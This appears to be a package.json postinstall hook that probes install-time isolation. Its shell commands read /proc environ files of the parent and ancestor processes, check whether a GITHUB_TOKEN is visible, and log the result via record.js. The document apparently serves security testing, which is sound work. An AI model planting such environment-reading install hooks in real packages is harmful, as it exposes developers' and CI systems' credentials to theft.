scripts.postinstall: node probe.js && (sh -c 'tr "\\0" "\\n" < /proc/$PPID/environ 2>/dev/null | grep -q PATH' && node record.js "sh: parent environ: readable" || node record.js "sh: parent environ: unreadable") && (sh -c 'for p in $PPID $(cut -d " " -f 4 /proc/$PPID/stat 2>/dev/null); do tr "\\0" "\\n" < /proc/$p/environ 2>/dev/null | grep -q GITHUB_TOKEN && exit 0; done; exit 1' && node record.js "sh: ancestor environ: leaked" || node record.js "sh: ancestor environ: hidden")
